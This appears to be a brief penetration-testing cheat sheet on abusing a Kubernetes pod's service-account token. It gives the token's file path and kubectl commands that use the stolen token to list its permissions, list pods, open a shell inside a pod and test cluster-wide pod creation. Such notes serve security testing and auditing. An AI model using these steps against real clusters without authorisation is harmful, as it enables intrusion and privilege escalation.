### Kubernetes store  the token of the service account running a pod in /var/run/secrets/kubernetes.io/serviceaccount/token. 

## Token type: JWT signed by the cluster

## TIP: If an account can do * verb on *.* resource, it means it is a cluster-admin, which also means we are able to run any kubectl command we eant.

#### 1) kubectl auth can-i --list --token=${TOKEN} --certificate-authority=ca.crt

#### 2) kubectl get pods --token={TOKEN}

#### 3) kubectl exec -it POD --token={TOKEN} -- /bin/bash (This gives us a shell on the target pod)

#### 4) kubectl --token=TOKEN --certificate-authority=ca.crt --server=https://IP_ADDRESS:8443 auth can-i create pods --all-namespaces
